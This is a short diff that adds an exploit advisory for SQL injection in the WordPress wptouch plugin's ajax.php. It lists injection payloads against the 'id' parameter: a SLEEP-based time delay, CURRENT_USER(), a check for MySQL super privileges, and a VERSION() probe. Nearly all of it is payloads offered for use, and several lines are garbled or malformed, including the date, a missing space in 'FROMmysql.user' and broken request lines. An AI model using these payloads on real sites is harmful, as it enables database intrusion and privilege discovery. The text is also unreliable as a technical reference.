@@ -1,0 +1,20 @@
+# Exploit Title: WordPress wptouch plugin SQL Injection Vulnerability
+# Date: 2011-27-10
+# Author: longrifle0x
+# software: Wordpress
+# Tools: SQLMAP
+---------------
+(POST data)
+---------------
+
+http://www.site.com/wp-content/plugins/wptouch/ajax.php
+
+#Exploit: id=-1; id=- AND SLEEP(5) or 1=if
+
+http://site.com/wp-content/plugins/wptouch/ajax.php][GET][id=-1][CURRENT_USER()
+
+http://site.com/wp-content/plugins/wptouch/ajax.php][GET][id=-1][SELECT
+(CASE WHEN ((SELECT super_priv FROMmysql.user WHERE user='None' LIMIT
+0,1)='Y') THEN 1 ELSE 0 END)
+
+http://site.com/wp-content/plugins/wptouch/ajax.php][GET][id=-1][MID((VERSION()),1,6)
